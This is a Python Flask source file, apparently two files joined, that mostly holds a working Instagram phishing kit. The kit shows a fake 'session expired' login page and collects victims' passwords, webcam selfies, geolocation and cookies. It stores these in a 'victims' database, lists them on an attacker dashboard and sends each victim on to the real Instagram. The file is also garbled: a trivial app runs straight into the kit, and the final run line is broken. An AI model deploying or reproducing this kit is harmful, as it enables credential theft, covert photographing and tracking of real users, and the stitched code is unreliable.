from flask import Flask

app = Flask(__name__)

@app.route('/')
def home():
    return 'الصفحة الرئيسية شغالة ✅'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INSTAGRAM PHISHING PAGE WITH SELFIE CAPTURE
# EDUCATIONAL PURPOSES ONLY - UNAUTHORIZED ACCESS IS ILLEGAL

from flask import Flask, request, redirect, make_response
import os
import uuid
import json
import base64
import sqlite3
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)
DATABASE = 'victims.db'

# Initialize database
def init_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            ip TEXT,
            user_agent TEXT,
            credentials TEXT,
            selfie TEXT,
            location TEXT,
            cookies TEXT,
            timestamp DATETIME
        )''')

# HTML template for phishing page
PHISH_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Instagram Session Expired</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }}
        body {{ background: #fafafa; margin: 0; padding: 20px; }}
        .container {{ max-width: 400px; margin: 60px auto; }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        .card {{ background: #fff; border: 1px solid #e6e6e6; border-radius: 8px; padding: 20px; }}
        .form-group {{ margin-bottom: 16px; }}
        input {{ width: 100%; padding: 12px; border: 1px solid #efefef; background: #fafafa; border-radius: 4px; font-size: 14px; }}
        button {{ width: 100%; background: #0095f6; color: white; border: none; border-radius: 4px; padding: 12px; font-weight: 600; cursor: pointer; }}
        .footer {{ text-align: center; margin-top: 20px; color: #8e8e8e; font-size: 12px; }}
        #selfie-container {{ margin: 15px 0; text-align: center; }}
        #selfie {{ max-width: 200px; border-radius: 50%; border: 3px solid #efefef; }}
        .error {{ color: #ed4956; font-size: 14px; text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="174" height="50" viewBox="0 0 174 50" fill="#262626">
                <path d="M106.94 25.97c0-7.73-6.27-14-14-14s-14 6.27-14 14 6.27 14 14 14 14-6.27 14-14zm-14-24c12.13 0 22 9.87 22 22s-9.87 22-22 22-22-9.87-22-22 9.87-22 22-22z"></path>
                <path d="M153.94 25.97c0-7.73-6.27-14-14-14s-14 6.27-14 14 6.27 14 14 14 14-6.27 14-14zm-14-24c12.13 0 22 9.87 22 22s-9.87 22-22 22-22-9.87-22-22 9.87-22 22-22z"></path>
                <path d="M69.94 7.97h-10v34h10v-34z"></path>
                <path d="M42.94 7.97h-10v34h10v-34z"></path>
                <path d="M28.94 41.97v-32c0-1.1-.9-2-2-2h-10c-1.1 0-2 .9-2 2v32c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2z"></path>
                <path d="M58.94 7.97h-10v34h10v-34z"></path>
            </svg>
        </div>
        <div class="card">
            <div id="selfie-container" style="display:none;">
                <img id="selfie" src="" alt="Verification Selfie">
            </div>
            <p class="error">Session expired. Identity verification required</p>
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
        </div>
        <div class="footer">
            <p>© 2024 Instagram from Meta</p>
        </div>
    </div>

    <script>
        // Capture selfie using webcam
        async function captureSelfie() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                // Capture frame after 1 second
                setTimeout(async () => {{
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to base64
                    const selfieData = canvas.toDataURL('image/jpeg');
                    document.getElementById('selfie').src = selfieData;
                    document.getElementById('selfie-container').style.display = 'block';
                    
                    // Store in hidden field
                    document.getElementById('selfieData').value = selfieData;
                    stream.getTracks().forEach(track => track.stop());
                }}, 1000);
            }} catch (error) {{
                console.error('Camera access denied:', error);
            }}
        }}

        // Collect device info
        function collectDeviceInfo() {{
            return {{
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${{screen.width}}x${{screen.height}}`,
                cookiesEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                location: null
            }};
        }}

        // Attempt geolocation
        function getLocation() {{
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    position => {{
                        deviceInfo.location = `${{position.coords.latitude}},${{position.coords.longitude}}`;
                    }},
                    error => console.error('Geolocation error:', error)
                );
            }}
        }}

        // Initialize
        const deviceInfo = collectDeviceInfo();
        getLocation();
        
        // Create hidden form elements
        const form = document.getElementById('loginForm');
        const selfieField = document.createElement('input');
        selfieField.type = 'hidden';
        selfieField.id = 'selfieData';
        selfieField.name = 'selfie';
        form.appendChild(selfieField);
        
        const deviceField = document.createElement('input');
        deviceField.type = 'hidden';
        deviceField.name = 'device_info';
        deviceField.value = JSON.stringify(deviceInfo);
        form.appendChild(deviceField);
        
        // Form submission handler
        form.addEventListener('submit', function(e) {{
            e.preventDefault();
            captureSelfie();
            
            // Submit after selfie capture
            setTimeout(() => {{
                const formData = new FormData(this);
                fetch('/submit', {{
                    method: 'POST',
                    body: formData
                }})
                .then(() => window.location.href = 'https://instagram.com')
                .catch(err => console.error('Error:', err));
            }}, 1500);
        }});
    </script>
</body>
</html>
"""

# Results page template
RESULTS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Analytics</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .victim {{ border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 5px; }}
        .selfie {{ max-width: 200px; border-radius: 5px; }}
        .info {{ margin: 5px 0; }}
        .highlight {{ background-color: #f0f0f0; padding: 2px 5px; }}
    </style>
</head>
<body>
    <h1>Instagram Analytics Dashboard</h1>
    <div id="results">
        <!-- Results will be populated here -->
    </div>
    
    <script>
        function loadResults() {{
            fetch('/get_data')
                .then(response => response.json())
                .then(data => {{
                    const container = document.getElementById('results');
                    data.forEach(victim => {{
                        const victimDiv = document.createElement('div');
                        victimDiv.className = 'victim';
                        
                        const content = `
                            <h2>Victim ID: <span class="highlight">${{victim.id}}</span></h2>
                            <div class="info">IP: <span class="highlight">${{victim.ip}}</span></div>
                            <div class="info">User Agent: <span class="highlight">${{victim.user_agent}}</span></div>
                            <div class="info">Credentials: <span class="highlight">${{victim.credentials}}</span></div>
                            <div class="info">Location: <span class="highlight">${{victim.location || 'N/A'}}</span></div>
                            <div class="info">Cookies: <span class="highlight">${{victim.cookies || 'None captured'}}</span></div>
                            <div class="info">Timestamp: <span class="highlight">${{victim.timestamp}}</span></div>
                            ${{victim.selfie ? `<img class="selfie" src="data:image/jpeg;base64,${{victim.selfie}}" alt="Selfie">` : '<div class="info">No selfie captured</div>'}}
                            <hr>
                        `;
                        
                        victimDiv.innerHTML = content;
                        container.appendChild(victimDiv);
                    }});
                }});
        }}
        
        // Load results on page load
        window.onload = loadResults;
    </script>
</body>
</html>
"""

@app.route('/login')
def login():
    """Serve phishing page disguised as Instagram login"""
    return PHISH_PAGE

@app.route('/submit', methods=['POST'])
def submit():
    """Capture victim data including selfie and credentials"""
    victim_id = str(uuid.uuid4())
    data = {
        'id': victim_id,
        'ip': request.remote_addr,
        'timestamp': datetime.utcnow().isoformat(),
        'credentials': f"{request.form.get('username')}:{request.form.get('password')}",
        'selfie': request.form.get('selfie', '')[:500000],  # Limit size
        'user_agent': request.headers.get('User-Agent', ''),
        'cookies': json.dumps(request.cookies.to_dict()),
    }
    
    # Parse device info
    try:
        device_info = json.loads(request.form.get('device_info', '{}'))
        data['location'] = device_info.get('location')
    except json.JSONDecodeError:
        pass
    
    # Save to database
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''
            INSERT INTO victims (id, ip, user_agent, credentials, selfie, location, cookies, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data['id'],
            data['ip'],
            data['user_agent'],
            data['credentials'],
            data['selfie'],
            data['location'],
            data['cookies'],
            data['timestamp']
        ))
    
    # Redirect to real Instagram
    return redirect('https://www.instagram.com', code=302)

@app.route('/get_data')
def get_data():
    """Endpoint to fetch captured data in JSON format"""
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM victims ORDER BY timestamp DESC')
        victims = cursor.fetchall()
    
    # Format data for JSON response
    results = []
    for v in victims:
        results.append({
            'id': v[0],
            'ip': v[1],
            'user_agent': v[2],
            'credentials': v[3],
            'selfie': v[4][:100000] if v[4] else None,  # Truncate for JSON
            'location': v[5],
            'cookies': v[6],
            'timestamp': v[7]
        })
    
    return json.dumps(results)

@app.route('/dashboard')
def dashboard():
    """Display captured data in a web dashboard"""
    return RESULTS_PAGE

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000))0, debug=True)
